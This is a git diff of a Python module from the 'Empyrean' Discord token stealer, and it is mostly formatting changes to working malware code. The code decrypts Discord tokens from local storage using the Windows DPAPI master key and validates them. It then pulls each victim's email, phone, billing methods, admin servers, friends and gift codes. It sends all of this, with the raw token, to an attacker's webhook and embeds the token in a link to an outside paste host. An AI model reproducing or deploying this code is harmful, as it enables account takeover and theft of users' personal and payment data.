@@ -8,10 +8,12 @@ from Crypto.Cipher import AES
 from discord import Embed, SyncWebhook
 from win32crypt import CryptUnprotectData
 
+
 class DiscordToken:
     def __init__(self, webhook):
         upload_tokens(webhook).upload()
-        
+
+
 class extract_tokens:
     def __init__(self) -> None:
         self.base_url = "https://discord.com/api/v9/users/@me"
@@ -67,10 +69,12 @@ class extract_tokens:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                            
+                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
+                                                     1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
+
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
@@ -82,7 +86,8 @@ class extract_tokens:
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regexp, line):
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
@@ -95,19 +100,21 @@ class extract_tokens:
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regexp, line):
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
 
     def validate_token(self, token: str) -> bool:
+        print(token)
         r = requests.get(self.base_url, headers={'Authorization': token})
 
         if r.status_code == 200:
             return True
 
         return False
-    
+
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
         payload = buff[15:]
@@ -133,6 +140,7 @@ class extract_tokens:
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
 
         return master_key
+
 
 class upload_tokens:
     def __init__(self, webhook: str):
@@ -210,26 +218,32 @@ class upload_tokens:
 
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
 
-    
     def upload(self):
         if not self.tokens:
             return
 
         for token in self.tokens:
-            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
-            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
-            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
-            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
+            user = requests.get(
+                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+            billing = requests.get(
+                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
+            guilds = requests.get(
+                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
+            friends = requests.get(
+                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+            gift_codes = requests.get(
+                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
 
             username = user['username'] + '#' + user['discriminator']
             user_id = user['id']
             email = user['email']
             phone = user['phone']
             mfa = user['mfa_enabled']
-            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
-            badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
-            
+            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
+                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+            badges = ' '.join([flag[0]
+                              for flag in self.calc_flags(user['public_flags'])])
+
             if user['premium_type'] == 0:
                 nitro = 'None'
             elif user['premium_type'] == 1:
@@ -241,14 +255,13 @@ class upload_tokens:
             else:
                 nitro = 'None'
 
-
             if billing:
                 payment_methods = []
 
                 for method in billing:
                     if method['type'] == 1:
                         payment_methods.append('💳')
-                    
+
                     elif method['type'] == 2:
                         payment_methods.append("<:paypal:973417655627288666>")
 
@@ -267,14 +280,15 @@ class upload_tokens:
                     if admin and guild['approximate_member_count'] >= 100:
                         owner = "✅" if guild['owner'] else "❌"
 
-                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
+                        invites = requests.get(
+                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                         if len(invites) > 0:
                             invite = f"https://discord.gg/{invites[0]['code']}"
                         else:
                             invite = "https://youtu.be/dQw4w9WgXcQ"
 
                         data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
-                        
+
                         if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                             break
 
@@ -282,7 +296,7 @@ class upload_tokens:
 
                 if len(hq_guilds) > 0:
                     hq_guilds = '\n'.join(hq_guilds)
-                
+
                 else:
                     hq_guilds = None
 
@@ -316,7 +330,7 @@ class upload_tokens:
 
             else:
                 hq_friends = None
-            
+
             if gift_codes:
                 codes = []
                 for code in gift_codes:
@@ -332,41 +346,52 @@ class upload_tokens:
 
                 if len(codes) > 0:
                     codes = '\n\n'.join(codes)
-                
+
                 else:
                     codes = None
-            
+
             else:
                 codes = None
 
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
+                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(
+                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:redboost:996004230345281546> Badges:",
+                            value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
+                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<:mfa:1021604916537602088> MFA:",
+                            value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
-            
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+
+            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
+                            value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:starxglow:996004217699434496> Phone:",
+                            value=f"{phone if phone != None else 'None'}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(
+                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
-           
+
             if hq_friends != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(
+                    name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
-                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(
+                    name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="github.com/addi00000/empyrean")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Empyrean",
+                              avatar_url="https://i.imgur.com/HjzfjfR.png")
